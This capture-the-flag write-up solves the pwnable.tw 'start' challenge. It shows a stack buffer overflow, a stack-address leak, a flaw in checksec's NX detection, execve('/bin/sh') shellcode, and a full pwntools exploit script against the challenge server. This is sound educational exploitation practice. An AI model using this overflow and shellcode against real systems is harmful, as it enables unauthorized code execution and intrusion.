Title: Pwnable.tw start
Date: 2018-8-1 10:02
Modified: 2018-8-1 10:02
Category: ctf
Tags: ctf, pwnable, binary exploitation, shellcode
Slug: pwnable_tw_start
Authors: F3real
Summary: How to solve pwnable.tw start challenge

This is another binary exploitation challenge, this time from pwnable.tw.

>    Just a start. nc chall.pwnable.tw 10000 
[start](https://pwnable.tw/static/chall/start)

Let’s inspect binary:

    root@kali:~/ctf/pwnable.tw_start# file start
    start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped

Check for security measures using **checksec**:

![Checksec result]({static}/images/2018_9_1_start3.png){: .img-fluid .centerimage}

And let’s run decompiler:

![Decompilation result]({static}/images/2018_9_1_start1.png){: .img-fluid .centerimage}

We see that binary is very simple, it makes two Linux syscalls, first write (`0x04`) and then it takes user input using `read` (Ox03). Type of call depends on the value in `EAX`, if you want more information about parameters for syscalls you can take a look at [https://syscalls.kernelgrok.com/](https://syscalls.kernelgrok.com/).

Now, we can run binary :

    root@kali:~/ctf/pwnable.tw_start# ./start
    Let's start the CTF:test
    root@kali:~/ctf/pwnable.tw_start#

We can use **gdb-peda** as we did in the previous post to detect offset of `EIP`.

    gdb-peda$ pattern search
    Registers contain pattern buffer:
    EIP+0 found at offset: 20
    Registers point to pattern buffer:
    [ECX] --> offset 0 - size ~631
    [ESP] --> offset 24 - size ~697
    Pattern buffer found at:
    0xffffd304 : offset    0 - size   40 ($sp + -0x18 [-6 dwords])
    Reference to pattern buffer not found in memory

We see that the offset of `EIP` is 20. Since binary is very small there is only one `ret;` instruction so it is probably not exploitable using ROP. Another problem is that we have **NX** bit set which means we also can’t use shellcode. At this point I was stuck. Challenge looked way harder then the first challenge in series should be, so I decided to inspect binary a bit more. Let’s run `readelf`:

    root@kali:~/ctf/pwnable.tw_start# readelf -l ./start

    Elf file type is EXEC (Executable file)
    Entry point 0x8048060
    There is 1 program header, starting at offset 52

    Program Headers:
      Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg 
      LOAD           0x000000 0x08048000 0x08048000 0x000a3 0x000a3 R E 

    Section to Segment mapping:
      Segment Sections...
       00     .text

It is interesting to see that there is no `GNU_STACK` header. And if we look at how **checksec** does **NX** bit check, we see:

~~~bash
  # check for NX support
  $debug && echo -e "\n***function filecheck->nx"
  if $readelf -W -l "$1" 2>/dev/null | grep 'GNU_STACK' | grep -q 'RWE'; then
    echo_message '\033[31mNX disabled\033[m   ' 'NX disabled,' ' nx="no"' '"nx":"no",'
  else
    echo_message '\033[32mNX enabled \033[m   ' 'NX enabled,' ' nx="yes"' '"nx":"yes",'
fi
~~~

Since it greps for **GNU_STACK** and checks for **RWE** permission on the result, even in the case that no **GNU_STACK** header is defined in binary, it will report that **NX** is enabled. So in the end it seems that we should try shellcode. Let’s just quickly fix **checksec**:

~~~bash
  # check for NX support
  $debug && echo -e "\n***function filecheck->nx"
  if $readelf -W -l "$1" 2>/dev/null | grep -q 'GNU_STACK'; then
    if $readelf -W -l "$1" 2>/dev/null | grep 'GNU_STACK' | grep -q 'RWE'; then
      echo_message '\033[31mNX disabled\033[m   ' 'NX disabled,' ' nx="no"' '"nx":"no",'
    else
      echo_message '\033[32mNX enabled \033[m   ' 'NX enabled,' ' nx="yes"' '"nx":"yes",'
    fi
  else
    echo_message '\033[31mNX disabled\033[m   ' 'NX disabled,' ' nx="no"' '"nx":"no",'
fi
~~~

First, we need to find a stack address so we can point `EIP` to the right place. Fortunately for us, one of the first instructions is `push esp;` which saves stack pointer to the stack. If we look at the flow of program we see that:

1. `mov ecx, esp;` will make `write` syscall read from the current stack address.

2. before `retn;` we have `add esp, 14h;` which removes all of that data pushed on stack after stack pointer (5 `push` instructions setting strings on the stack) making `ESP` point to the saved stack pointer.

So if we trigger write again it will read saved stack pointer address. To do that we can use following **ROP** gadget:

    0x08048087:mov ecx, esp; mov dl, 0x14; mov bl,1; mov al, 4;int 0x80;

So first payload we use is going to be:

    'A'* 20 + p32(0x08048087)

After our first input, the program will give us a stack pointer address and trigger the next `read` syscall (since first `ret;` instruction, if we look at the original assembly, is after `read`). This time we are going to put shellcode on the stack and point `EIP` to leaked stack pointer address. Let’s use simple `execve` syscall:

    shellcode = asm('\n'.join([
        'push %d' % u32('/sh\0'),
        'push %d' % u32('/bin'),
        'xor edx, edx',
        'xor ecx, ecx',
        'mov ebx, esp',
        'mov eax, 0xb',
        'int 0x80',
    ]))

    payload = "A"*20  + p32(esp + 20) + shellcode

And we get a shell :D

![Shell]({static}/images/2018_9_1_start2.png){: .img-fluid .centerimage}

We can combine all of this in one **pwntool** script for simplicity.

~~~python
from pwn import *

def leak_esp(r):
	address_1 = p32(0x08048087)             # mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; 
	payload = 'A'*20 + address_1
	print r.recvuntil('CTF:')
	r.send(payload)
	esp = u32(r.recv()[:4])
	print "Address of ESP: ", hex(esp)
	return esp

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

if __name__ == "__main__":
    context.arch = 'i386'
    r = remote('chall.pwnable.tw', 10000)
    #gdb.attach(r)
    esp = leak_esp(r)
    payload = "A"*20  + p32(esp + 20) + shellcode 
    r.send(payload)
r.interactive()
~~~
